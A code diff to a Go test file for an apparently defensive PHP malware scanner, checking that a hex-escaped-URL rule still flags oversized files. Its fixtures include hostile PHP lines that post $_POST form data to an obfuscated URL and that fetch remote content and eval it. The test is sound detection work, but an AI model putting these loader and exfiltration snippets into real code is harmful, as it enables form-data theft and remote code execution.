@@ -148,13 +148,43 @@ func TestHexEscapedURL_OversizedLoaderFlowsStillFlagged(t *testing.T) {
 		`<?php $endpoint = ` + escaped + `; wp_remote_post($endpoint, array('body' => $_POST));`,
 		`<?php $url = ` + escaped + `; curl_setopt($handle, CURLOPT_URL, $url); curl_setopt($handle, CURLOPT_POSTFIELDS, $_POST);`,
 	} {
-		content := []byte(prefix + strings.Repeat("\nfunction ordinary_padding($v) { return trim($v); }", 1600))
-		if len(content) <= 65536 {
-			t.Fatalf("setup: oversized loader fixture is only %d bytes", len(content))
+		// The property under test is that a file past php_hex_escaped_url's
+		// max_file_bytes is still flagged by the unbounded loader rules. That
+		// bound is evaluated against the size the caller declares, so declaring
+		// an oversized snapshot exercises the same path as padding the fixture
+		// to 80KB -- at a fraction of the bytes to scan. One case below keeps
+		// real padding so the end-to-end path stays covered.
+		content := []byte(prefix)
+		const oversized = 65536 * 2
+		if len(content) >= oversized {
+			t.Fatalf("setup: fixture is already %d bytes, so the declared size proves nothing", len(content))
 		}
-		if !hasRule(scanner.ScanContent(content, ".php"), "php_hex_escaped_url") {
+		if !hasRule(scanner.ScanContentWithSize(content, ".php", oversized), "php_hex_escaped_url") {
 			t.Errorf("php_hex_escaped_url regression: oversized escaped-URL loader flow not detected: %s", prefix)
 		}
+	}
+
+	// Negative control for the mechanism above: the same declared size, on a
+	// sample carrying only the escaped URL and no loader flow, must NOT match.
+	// If declaring the size failed to engage max_file_bytes, the bounded arm
+	// would still fire here and every assertion above would prove nothing.
+	bare := []byte(`<?php $u = ` + escaped + `;`)
+	if !hasRule(scanner.ScanContent(bare, ".php"), "php_hex_escaped_url") {
+		t.Fatal("setup: bare escaped URL should match while it is within the size bound")
+	}
+	if hasRule(scanner.ScanContentWithSize(bare, ".php", 65536*2), "php_hex_escaped_url") {
+		t.Error("declared oversized size did not bound the rule, so the cases above prove nothing")
+	}
+
+	// One genuinely oversized fixture, so the cheap declared-size cases above
+	// cannot all pass while real large content is broken.
+	padded := []byte(`<?php $url = ` + escaped + `; $payload = file_get_contents($url); eval($payload);` +
+		strings.Repeat("\nfunction ordinary_padding($v) { return trim($v); }", 1600))
+	if len(padded) <= 65536 {
+		t.Fatalf("setup: oversized loader fixture is only %d bytes", len(padded))
+	}
+	if !hasRule(scanner.ScanContent(padded, ".php"), "php_hex_escaped_url") {
+		t.Error("php_hex_escaped_url regression: real oversized loader flow not detected")
 	}
 }
 
